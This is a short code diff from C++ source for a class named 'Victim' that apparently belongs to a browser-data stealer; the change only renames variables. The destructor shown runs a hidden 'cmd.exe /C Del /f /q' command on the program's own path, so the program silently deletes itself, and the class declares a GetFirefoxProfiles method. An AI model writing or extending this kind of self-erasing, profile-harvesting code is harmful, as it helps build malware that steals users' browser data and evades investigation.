@@ -42,12 +42,12 @@ public:
 		CurrentDirectory = GetCommandLineA();
 	}
 	~Victim() {
-		STARTUPINFOA si = { 0 };
-		PROCESS_INFORMATION pi = { 0 };
+		STARTUPINFOA startupInfo = { 0 };
+		PROCESS_INFORMATION processInformation = { 0 };
 		std::string REMOVECOMMAND = "cmd.exe /C Del /f /q " + this->CurrentDirectory;
-		CreateProcessA(NULL, (char*)REMOVECOMMAND.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-		CloseHandle(pi.hThread);
-		CloseHandle(pi.hProcess);
+		CreateProcessA(NULL, (char*)REMOVECOMMAND.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation);
+		CloseHandle(processInformation.hThread);
+		CloseHandle(processInformation.hProcess);
 	}
 
 	bool GetFirefoxProfiles();
